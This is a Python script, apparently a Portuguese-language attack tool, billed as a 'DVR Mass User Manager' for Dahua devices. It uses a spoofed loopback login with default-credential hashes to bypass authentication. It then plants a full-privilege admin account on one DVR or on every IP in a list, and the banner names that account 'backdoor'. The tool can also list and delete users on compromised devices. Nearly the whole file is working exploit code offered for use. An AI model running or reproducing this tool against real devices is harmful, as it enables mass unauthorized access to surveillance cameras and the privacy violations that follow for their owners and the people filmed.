#!/usr/bin/env python3
"""
DVR Mass User Manager - Dahua Compatible
Uso:
    Modo Massa: python3 dh.py -f ips.txt -p 80 -u admin -P Senha@2026
    Modo Manual: python3 dh.py -i 192.168.0.15 -p 37777
    Modo Interativo: python3 dh.py
"""

import socket
import json
import struct
import sys
import hashlib
import re
import argparse
import time
from datetime import datetime

# Configurações padrão
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "admin"
DEFAULT_NEW_USER = "usr"
DEFAULT_NEW_PASS = "Senha@2026"
DEFAULT_PORT = 80
TIMEOUT = 10

REALM_CAPTURADO = None
SESSION_ADMIN = None

# ================= FUNÇÕES PRINCIPAIS =================

def dahua_gen2_md5_hash(dh_realm, username, password):
    """Hash Gen2 - Formato: MD5(username:realm:password) em MAIÚSCULAS"""
    to_hash = f"{username}:{dh_realm}:{password}"
    return hashlib.md5(to_hash.encode('utf-8')).hexdigest().upper()

def interceptar_realm(dados):
    global REALM_CAPTURADO
    try:
        if isinstance(dados, bytes):
            dados = dados.decode('latin-1', errors='ignore')
        if '"realm"' in dados:
            match = re.search(r'"realm":"([^"]+)"', dados)
            if match:
                realm = match.group(1)
                if realm and realm != REALM_CAPTURADO:
                    REALM_CAPTURADO = realm
                    return True
    except:
        pass
    return False

def limpar_buffer(sock):
    try:
        sock.settimeout(0.1)
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
    except socket.timeout:
        pass
    finally:
        sock.settimeout(10)

def enviar_comando(sock, query, session_id, timeout=15):
    limpar_buffer(sock)
    
    header_magic = struct.pack('>Q', 0x2000000044484950)
    json_bytes = json.dumps(query).encode('latin-1')
    
    cmd_id = query.get('id', 1)
    
    header_payload = struct.pack('<I', session_id) + struct.pack('<I', cmd_id) + struct.pack('<I', len(json_bytes)) + struct.pack('<I', 0) + struct.pack('<I', len(json_bytes)) + struct.pack('<I', 0)
    packet = header_magic + header_payload + json_bytes
    
    sock.sendall(packet)
    sock.settimeout(timeout)
    
    try:
        resp_header = b""
        while len(resp_header) < 32:
            chunk = sock.recv(32 - len(resp_header))
            if not chunk:
                break
            resp_header += chunk
        
        if len(resp_header) == 32:
            resp_len = struct.unpack('<I', resp_header[16:20])[0]
            resp_body = b""
            while len(resp_body) < resp_len:
                chunk = sock.recv(min(65536, resp_len - len(resp_body)))
                if not chunk:
                    break
                resp_body += chunk
            
            interceptar_realm(resp_body)
            
            try:
                return json.loads(resp_body.decode('latin-1'))
            except:
                resp_str = resp_body.decode('latin-1', errors='ignore')
                start = resp_str.find('{')
                end = resp_str.rfind('}')
                if start != -1 and end != -1 and end > start:
                    try:
                        return json.loads(resp_str[start:end+1])
                    except:
                        pass
                return None
    except:
        return None
    
    return None

def conectar_dvr(host, port):
    """Conecta a um DVR e faz bypass"""
    global REALM_CAPTURADO, SESSION_ADMIN
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((host, port))
        
        # Primeiro login
        first_login = {
            "method": "global.login",
            "params": {
                "userName": "admin",
                "password": "",
                "clientType": "Console",
                "loginType": "Direct"
            },
            "id": 1,
            "session": 0
        }
        
        data = enviar_comando(sock, first_login, 0)
        
        if not data:
            return None, None
        
        session_alvo = data.get("session")
        realm = data.get("params", {}).get("realm", "Dahua")
        REALM_CAPTURADO = realm
        
        # Bypass loopback
        admin_hash = dahua_gen2_md5_hash(realm, "admin", "admin")
        
        bypass_login = {
            "method": "global.login",
            "params": {
                "userName": "admin",
                "ipAddr": "127.0.0.1",
                "loginType": "Loopback",
                "clientType": "Local",
                "authorityType": "Default",
                "passwordType": "Default",
                "password": admin_hash
            },
            "id": 2,
            "session": session_alvo
        }
        
        data = enviar_comando(sock, bypass_login, session_alvo)
        
        if data and data.get("result"):
            SESSION_ADMIN = data.get("session")
            return sock, SESSION_ADMIN
        else:
            sock.close()
            return None, None
            
    except Exception as e:
        return None, None

def adicionar_usuario_dvr(sock, session_alvo, username, password, realm):
    """Adiciona usuário em um DVR já conectado"""
    password_hash = dahua_gen2_md5_hash(realm, username, password)
    
    authority_list = [
        "Monitor", "Monitor_01", "Monitor_02", "Monitor_03", "Monitor_04",
        "Monitor_05", "Monitor_06", "Monitor_07", "Monitor_08", "Replay",
        "Replay_01", "Replay_02", "Replay_03", "Replay_04", "Replay_05",
        "Replay_06", "Replay_07", "Replay_08", "AuthUserMag", "AuthSysCfg",
        "AuthSysInfo", "AuthManuCtr", "AuthStoreCfg", "AuthEventCfg",
        "AuthNetCfg", "AuthRmtDevice", "AuthSecurity", "AuthBackup", "AuthMaintence"
    ]
    
    query = {
        "method": "userManager.addUser",
        "params": {
            "user": {
                "Name": username,
                "Password": password_hash,
                "Group": "admin",
                "AuthorityList": authority_list,
                "Sharable": True,
                "Reserved": False,
                "Type": "Normal",
                "MaxMonitorChannels": 0
            }
        },
        "id": 20,
        "session": session_alvo
    }
    
    data = enviar_comando(sock, query, session_alvo)
    
    if data and data.get("result"):
        return True
    return False

def processar_dvr(host, port, novo_user, nova_senha, verbose=True):
    """Processa um único DVR"""
    if verbose:
        print(f"\n[*] Processando: {host}:{port}")
    
    sock, session = conectar_dvr(host, port)
    
    if not sock:
        if verbose:
            print(f"[-] Falha ao conectar em {host}:{port}")
        return False
    
    if adicionar_usuario_dvr(sock, session, novo_user, nova_senha, REALM_CAPTURADO):
        if verbose:
            print(f"[+] ✅ Usuário '{novo_user}' criado em {host}:{port}")
        sock.close()
        return True
    else:
        if verbose:
            print(f"[-] Falha ao criar usuário em {host}:{port}")
        sock.close()
        return False

def ler_ips_do_arquivo(arquivo):
    """Lê lista de IPs de um arquivo"""
    ips = []
    try:
        with open(arquivo, 'r') as f:
            for linha in f:
                linha = linha.strip()
                if linha and not linha.startswith('#'):
                    ips.append(linha)
    except Exception as e:
        print(f"[-] Erro ao ler arquivo: {e}")
        return []
    return ips

# ================= MENU INTERATIVO =================

def menu_interativo():
    """Menu interativo para gerenciamento manual"""
    sock = None
    session = None
    host = None
    
    print("\n" + "="*60)
    print("     MODO INTERATIVO - DVR MANAGEMENT TOOL")
    print("="*60)
    
    host = input("IP do DVR: ").strip()
    if not host:
        print("[-] IP obrigatório!")
        return
    
    try:
        porta = int(input("Porta (80 ou 37777) [80]: ").strip() or "80")
    except:
        porta = 80
    
    print(f"\n[*] Conectando a {host}:{porta}...")
    sock, session = conectar_dvr(host, porta)
    
    if not sock:
        print("[-] Falha na conexão!")
        return
    
    print("\n[+] ✅ Conectado com sucesso!\n")
    
    while True:
        print("\n" + "="*60)
        print("     GERENCIADOR DE USUÁRIOS DO DVR")
        print(f"     DVR: {host}:{porta}")
        print(f"     Realm: {REALM_CAPTURADO}")
        print("="*60)
        print("1. 📋 Listar todos os usuários")
        print("2. ➕ Criar novo usuário")
        print("3. ❌ Deletar usuário")
        print("4. 🔄 Reconectar")
        print("0. 🚪 Sair")
        print("-"*60)
        
        opcao = input("\nEscolha uma opção: ").strip()
        
        if opcao == "1":
            listar_usuarios(sock, session)
        elif opcao == "2":
            username = input("Nome do novo usuário: ").strip()
            password = input("Senha: ").strip()
            if username and password:
                if adicionar_usuario_dvr(sock, session, username, password, REALM_CAPTURADO):
                    print(f"[+] ✅ Usuário '{username}' criado com SUCESSO!")
                else:
                    print("[-] Falha ao criar usuário!")
            else:
                print("[-] Nome e senha são obrigatórios!")
        elif opcao == "3":
            username = input("Nome do usuário a deletar: ").strip()
            if username:
                deletar_usuario(sock, session, username)
        elif opcao == "4":
            sock.close()
            print(f"\n[*] Reconectando a {host}:{porta}...")
            sock, session = conectar_dvr(host, porta)
            if not sock:
                print("[-] Falha na reconexão!")
                break
            print("[+] ✅ Reconectado!")
        elif opcao == "0":
            print("\n[*] Encerrando...")
            break
        else:
            print("[-] Opção inválida!")
    
    if sock:
        sock.close()

def listar_usuarios(sock, session_alvo):
    """Lista todos os usuários"""
    print("\n" + "="*60)
    print(" LISTANDO USUÁRIOS")
    print("="*60)
    
    query = {
        "method": "userManager.getUserInfoAll",
        "params": {},
        "id": 3,
        "session": session_alvo
    }
    
    data = enviar_comando(sock, query, session_alvo, timeout=30)
    
    if data and data.get("result") and "users" in data.get("params", {}):
        users = data["params"]["users"]
        print(f"\n[+] Total de usuários: {len(users)}")
        print("="*50)
        for u in users:
            print(f"  👤 {u.get('Name')} (Grupo: {u.get('Group')}, ID: {u.get('Id')})")
        return users
    else:
        print("[-] Falha ao listar usuários")
        return []

def deletar_usuario(sock, session_alvo, username):
    """Deleta um usuário"""
    print("\n" + "="*60)
    print(f" DELETANDO USUÁRIO: {username}")
    print("="*60)
    
    if username.lower() == "admin":
        print("[-] Não é permitido deletar o usuário 'admin'!")
        return False
    
    confirmar = input(f"Tem certeza que deseja deletar '{username}'? (s/N): ").strip().lower()
    if confirmar != 's':
        print("[*] Operação cancelada.")
        return False
    
    query = {
        "method": "userManager.deleteUser",
        "params": {"name": username},
        "id": 30,
        "session": session_alvo
    }
    
    data = enviar_comando(sock, query, session_alvo)
    
    if data and data.get("result"):
        print(f"[+] ✅ Usuário '{username}' deletado com SUCESSO!")
        return True
    else:
        print(f"[-] Falha ao deletar: {data}")
        return False

# ================= MODO MASSA =================

def modo_massa(arquivo_ips, porta, novo_user, nova_senha, verbose=True):
    """Processa múltiplos DVRs em lote"""
    print("\n" + "="*60)
    print("     MODO MASSA - ADICIONANDO USUÁRIOS")
    print("="*60)
    print(f"Arquivo: {arquivo_ips}")
    print(f"Porta: {porta}")
    print(f"Usuário a criar: {novo_user}")
    print(f"Senha: {nova_senha}")
    print("="*60)
    
    ips = ler_ips_do_arquivo(arquivo_ips)
    
    if not ips:
        print("[-] Nenhum IP encontrado no arquivo!")
        return
    
    print(f"\n[+] Total de IPs para processar: {len(ips)}")
    
    sucessos = []
    falhas = []
    
    for i, ip in enumerate(ips, 1):
        print(f"\n[{i}/{len(ips)}] ", end="")
        
        # Configurar porta global para a função
        global RPORT
        RPORT = porta
        
        if processar_dvr(ip, porta, novo_user, nova_senha, verbose):
            sucessos.append(ip)
        else:
            falhas.append(ip)
        
        time.sleep(1)  # Delay entre conexões
    
    print("\n" + "="*60)
    print(" RELATÓRIO FINAL")
    print("="*60)
    print(f"[+] Sucessos: {len(sucessos)}")
    for ip in sucessos:
        print(f"    ✅ {ip}")
    
    print(f"\n[-] Falhas: {len(falhas)}")
    for ip in falhas:
        print(f"    ❌ {ip}")

# ================= MODO SINGLE =================

def modo_single(host, porta, novo_user, nova_senha):
    """Processa um único DVR via linha de comando"""
    print("\n" + "="*60)
    print("     MODO SINGLE - ADICIONANDO USUÁRIO")
    print("="*60)
    print(f"Host: {host}:{porta}")
    print(f"Usuário a criar: {novo_user}")
    print("="*60)
    
    global RPORT
    RPORT = porta
    
    if processar_dvr(host, porta, novo_user, nova_senha, verbose=True):
        print(f"\n[+] ✅ Usuário '{novo_user}' criado com sucesso em {host}:{porta}")
    else:
        print(f"\n[-] ❌ Falha ao criar usuário em {host}:{porta}")

# ================= MAIN =================

def main():
    parser = argparse.ArgumentParser(description='DVR Mass User Manager - Dahua Compatible')
    parser.add_argument('-f', '--file', help='Arquivo com lista de IPs (um por linha)')
    parser.add_argument('-i', '--ip', help='IP único do DVR')
    parser.add_argument('-p', '--port', type=int, default=80, help='Porta (80 ou 37777, padrão: 80)')
    parser.add_argument('-u', '--user', default=DEFAULT_NEW_USER, help=f'Nome do usuário a criar (padrão: {DEFAULT_NEW_USER})')
    parser.add_argument('-P', '--password', default=DEFAULT_NEW_PASS, help=f'Senha do usuário (padrão: {DEFAULT_NEW_PASS})')
    parser.add_argument('-q', '--quiet', action='store_true', help='Modo silencioso (menos output)')
    
    args = parser.parse_args()
    
    # Modo Interativo (sem argumentos)
    if len(sys.argv) == 1:
        menu_interativo()
        return
    
    # Modo Massa (com arquivo)
    if args.file:
        modo_massa(args.file, args.port, args.user, args.password, not args.quiet)
        return
    
    # Modo Single (com IP)
    if args.ip:
        modo_single(args.ip, args.port, args.user, args.password)
        return
    
    # Se não especificou nem arquivo nem IP
    parser.print_help()

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║         DVR MASS USER MANAGER - Dahua Compatible         ║
    ║                                                          ║
    ║  Modos de uso:                                           ║
    ║    • Interativo: python3 dh.py                          ║
    ║    • Single: python3 dh.py -i 192.168.0.15 -p 80        ║
    ║    • Massa: python3 dh.py -f ips.txt -p 80 -u backdoor  ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    main()
